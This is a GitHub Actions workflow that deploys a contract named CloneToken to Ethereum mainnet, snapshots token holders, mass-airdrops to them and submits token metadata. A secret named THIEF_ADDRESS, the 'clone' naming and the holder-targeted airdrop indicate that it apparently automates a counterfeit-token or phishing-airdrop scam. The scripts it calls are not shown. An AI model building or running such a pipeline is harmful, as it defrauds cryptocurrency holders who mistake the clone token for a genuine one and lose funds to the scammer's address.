name: Deploy & Airdrop Clone

on:
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1

      - name: Install Node
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Install deps
        run: |
          npm install ethers@^6 axios dotenv

      - name: Load secrets
        run: |
          echo "ALCHEMY_KEY=${{ secrets.ALCHEMY_KEY }}" >> $GITHUB_ENV
          echo "ETHERSCAN_KEY=${{ secrets.ETHERSCAN_KEY }}" >> $GITHUB_ENV
          echo "PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}" >> $GITHUB_ENV
          echo "THIEF_ADDRESS=${{ secrets.THIEF_ADDRESS }}" >> $GITHUB_ENV

      - name: Deploy clone token
        run: |
          forge build
          forge create \
            --rpc-url https://eth-mainnet.g.alchemy.com/v2/$ALCHEMY_KEY \
            --private-key $PRIVATE_KEY \
            --etherscan-api-key $ETHERSCAN_KEY \
            --verify \
            src/CloneToken.sol:CloneToken

      - name: Snapshot holders
        run: node scripts/snapshot.js

      - name: Mass airdrop
        run: node scripts/airdrop.js

      - name: Submit token info
        run: node scripts/submit-token-info.js
